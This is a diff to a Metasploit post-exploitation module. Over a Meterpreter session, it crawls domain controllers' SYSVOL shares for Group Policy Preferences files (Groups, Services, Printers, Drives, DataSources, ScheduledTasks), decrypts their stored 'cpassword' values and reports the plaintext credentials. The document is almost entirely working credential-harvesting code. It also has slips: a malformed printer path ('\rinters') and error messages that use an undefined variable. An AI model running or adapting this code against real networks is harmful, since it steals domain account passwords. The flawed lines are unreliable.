@@ -56,7 +56,18 @@ class Metasploit3 < Msf::Post
 
 	def run
 		dcs = []
-		paths = []
+		group_paths = []
+		group_path = "Groups\\Groups.xml"
+		service_paths = []
+		service_path = "Services\\Services.xml"
+		printer_paths = []
+		printer_path = "\rinters\\Printers.xml"
+		drive_paths = []
+		drive_path = "Drives\\Drives.xml"
+		datasource_paths = []
+		datasource_path = "Datasources\\DataSources.xml"
+		task_paths = []
+		task_path = "ScheduledTasks\\ScheduledTasks.xml"
 
 		if !datastore['DOMAINS'].to_s.empty?
 			user_domains = datastore['DOMAINS'].to_s.split(' ')
@@ -87,48 +98,87 @@ class Metasploit3 < Msf::Post
 
 		dcs = dcs.flatten.compact
 		dcs.each do |dc|
-			print_status "Recursively searching for Groups.xml on #{dc}..."
-			tmpath = "\\\\#{dc}\\SYSVOL\\"
-			paths << find_paths(tmpath)
+			print_status "Searching on #{dc}..."
+			sysvol_path = "\\\\#{dc}\\SYSVOL\\"
+			begin
+				# Enumerate domain folders
+				session.fs.dir.foreach(sysvol_path) do |domain_dir|
+					next if domain_dir =~ /^(\.|\.\.)$/
+					domain_path = "#{sysvol_path}#{domain_dir}\\Policies\\"
+					print_status "Looking in domain folder #{domain_path}"
+					# Enumerate policy folders {...}
+					begin
+						session.fs.dir.foreach(domain_path) do |policy_dir|
+							next if policy_dir =~ /^(\.|\.\.)$/
+							policy_path = "#{domain_path}\\#{policy_dir}"
+							group_paths << find_path(policy_path, group_path)
+							service_paths << find_path(policy_path, service_path)							
+							printer_paths << find_path(policy_path, printer_path)
+							drive_paths << find_path(policy_path, drive_path)
+							datasource_paths << find_path(policy_path, datasource_path)
+							task_paths << find_path(policy_path, task_path)
+						end
+					rescue Rex::Post::Meterpreter::RequestError => e
+						print_error "Received error code #{e.code} when reading #{tpath}"
+					end
+				end
+			rescue Rex::Post::Meterpreter::RequestError => e
+				print_error "Received error code #{e.code} when reading #{tpath}"
+			end
 		end
 
-		paths = paths.flatten.compact
-		paths.each do |path|
-			data, dc = get_xml(path)
-			parse_xml(data, dc)
+		group_paths = group_paths.flatten.compact
+		service_paths = service_paths.flatten.compact
+		printer_paths = printer_paths.flatten.compact
+		drive_paths = drive_paths.flatten.compact
+		datasource_paths = datasource_paths.flatten.compact
+		task_paths = task_paths.flatten.compact
+		
+		print_status "Results from Groups.xml:"
+		group_paths.each do |path|
+			mxml, dc = get_xml(path)
+			parse_group_xml(mxml, dc)
 		end
-
+		
+		print_status "Results from Services.xml:"
+		service_paths.each do |path|
+			mxml, dc = get_xml(path)
+			parse_service_xml(mxml, dc)
+		end
+		
+		print_status "Results from Printers.xml:"
+		printer_paths.each do |path|
+			mxml, dc = get_xml(path)
+			parse_printer_xml(mxml, dc)
+		end
+		
+		print_status "Results from Drives.xml:"
+		drive_paths.each do |path|
+			mxml, dc = get_xml(path)
+			parse_drive_xml(mxml, dc)
+		end
+		
+		print_status "Results from DataSources.xml:"
+		datasource_paths.each do |path|
+			mxml, dc = get_xml(path)
+			parse_datasource_xml(mxml, dc)
+		end
+		
+		print_status "Results from ScheduledTasks.xml:"
+		task_paths.each do |path|
+			mxml, dc = get_xml(path)
+			parse_scheduled_task_xml(mxml, dc)
+		end
 	end
 
-	def find_paths(path)
-		paths=[]
+	def find_path(path, xml_path)
+		xml_path = "#{path}\\MACHINE\\Preferences\\#{xml_path}"
 		begin
-			# Enumerate domain folders
-			session.fs.dir.foreach(path) do |sub|
-				next if sub =~ /^(\.|\.\.)$/
-				tpath = "#{path}#{sub}\\Policies\\"
-				print_status "Looking in domain folder #{tpath}"
-				# Enumerate policy folders {...}
-				begin
-					session.fs.dir.foreach(tpath) do |sub2|
-						next if sub2 =~ /^(\.|\.\.)$/
-						tpath2 = "#{tpath}#{sub2}\\MACHINE\\Preferences\\Groups\\Groups.xml"
-						begin
-							paths << tpath2 if client.fs.file.stat(tpath2)
-						rescue Rex::Post::Meterpreter::RequestError => e
-							# No permissions for this specific file.
-							next
-						end
-					end
-				rescue Rex::Post::Meterpreter::RequestError => e
-					print_error "Received error code #{e.code} when reading #{tpath}"
-				end
-			end
+			return xml_path if client.fs.file.stat(xml_path)
 		rescue Rex::Post::Meterpreter::RequestError => e
-			print_error "Received error code #{e.code} when reading #{path}"
+			# No permissions for this specific file.
 		end
-
-		return paths
+		return nil
 	end
 
 	def get_xml(path)
@@ -139,17 +189,105 @@ class Metasploit3 < Msf::Post
 			end
 
 			domain = path.split('\\')[2]
-			return data, domain
+			
+			mxml = REXML::Document.new(data).root
+			
+			return mxml, domain
 		rescue Rex::Post::Meterpreter::RequestError => e
 				print_error "Received error code #{e.code} when reading #{path}"
 		end
 	end
-
-	def parse_xml(data,domain_controller)
-		mxml = REXML::Document.new(data).root
+	
+	def parse_service_xml(mxml,domain_controller)
 		mxml.elements.to_a("//Properties").each do |node|
 			epassword = node.attributes['cpassword']
 			next if epassword.to_s.empty?
+			
+			user = node.attributes['accountName']
+			service_name = node.attributes['serviceName']
+			
+			changed = node.parent.attributes['changed']
+			
+			pass = decrypt(epassword)
+			
+			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} SERVICE: #{service_name} CHANGED: #{changed}"
+			report_creds(user,pass)
+		end
+	end
+	
+	def parse_printer_xml(mxml,domain_controller)
+		mxml.elements.to_a("//Properties").each do |node|
+			epassword = node.attributes['cpassword']
+			next if epassword.to_s.empty?
+			
+			user = node.attributes['username']
+			path = node.attributes['path']
+			
+			changed = node.parent.attributes['changed']
+			
+			pass = decrypt(epassword)
+			
+			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} PATH: #{path} CHANGED: #{changed}"
+			report_creds(user,pass)
+		end
+	end
+	
+	def parse_drive_xml(mxml,domain_controller)
+		mxml.elements.to_a("//Properties").each do |node|
+			epassword = node.attributes['cpassword']
+			next if epassword.to_s.empty?
+			
+			user = node.attributes['username']
+			path = node.attributes['path']
+			
+			changed = node.parent.attributes['changed']
+			
+			pass = decrypt(epassword)
+			
+			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} PATH: #{path} CHANGED: #{changed}"
+			report_creds(user,pass)
+		end
+	end
+	
+	def parse_datasource_xml(mxml,domain_controller)
+		mxml.elements.to_a("//Properties").each do |node|
+			epassword = node.attributes['cpassword']
+			next if epassword.to_s.empty?
+			
+			user = node.attributes['username']
+			dsn = node.attributes['dsn']
+			
+			changed = node.parent.attributes['changed']
+			
+			pass = decrypt(epassword)
+			
+			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} DSN: #{dsn} CHANGED: #{changed}"
+			report_creds(user,pass)
+		end
+	end
+	
+	def parse_scheduled_task_xml(mxml,domain_controller)
+		mxml.elements.to_a("//Properties").each do |node|
+			epassword = node.attributes['cpassword']
+			next if epassword.to_s.empty?
+			
+			user = node.attributes['runas']
+			task_name = node.attributes['name']
+			
+			changed = node.parent.attributes['changed']
+			
+			pass = decrypt(epassword)
+			
+			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} Task: #{task_name} CHANGED: #{changed}"
+			report_creds(user,pass)
+		end
+	end
+
+	def parse_group_xml(mxml,domain_controller)
+		mxml.elements.to_a("//Properties").each do |node|
+			epassword = node.attributes['cpassword']
+			next if epassword.to_s.empty?
+			
 			user = node.attributes['userName']
 			newname = node.attributes['newName']
 			disabled = node.attributes['acctDisabled']
@@ -161,7 +299,8 @@ class Metasploit3 < Msf::Post
 			no_change = node.attributes['noChange']
 			change_logon = node.attributes['changeLogon']
 			sub_authority = node.attributes['subAuthority']
-			changed = node.parent.attributes['changed'] # n.b. parent attribute.
+			
+			changed = node.parent.attributes['changed']
 
 			# Check if policy also specifies the user is renamed.
 			if !newname.to_s.empty?
@@ -170,25 +309,28 @@ class Metasploit3 < Msf::Post
 
 			pass = decrypt(epassword)
 
-			# UNICODE conversion
-			pass = pass.unpack('v*').pack('C*')
 			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} DISABLED: #{disabled} CHANGED: #{changed}"
 
-			if session.db_record
-				source_id = session.db_record.id
-			else
-				source_id = nil
-			end
-			report_auth_info(
-				:host  => session.sock.peerhost,
-				:port => 445,
-				:sname => 'smb',
-				:proto => 'tcp',
-				:source_id => source_id,
-				:source_type => "exploit",
-				:user => user,
-				:pass => pass)
+			report_creds(user,pass)
 		end
+	end
+	
+	def report_creds(user, pass)
+		if session.db_record
+			source_id = session.db_record.id
+		else
+			source_id = nil
+		end
+		
+		report_auth_info(
+			:host  => session.sock.peerhost,
+			:port => 445,
+			:sname => 'smb',
+			:proto => 'tcp',
+			:source_id => source_id,
+			:source_type => "exploit",
+			:user => user,
+			:pass => pass)
 	end
 
 	def decrypt(encrypted_data)
@@ -202,8 +344,9 @@ class Metasploit3 < Msf::Post
 		aes.key = key
 		plaintext = aes.update(decoded)
 		plaintext << aes.final
-
-		return plaintext
+		pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion
+		
+		return pass
 	end
 
 	#enum_domains.rb
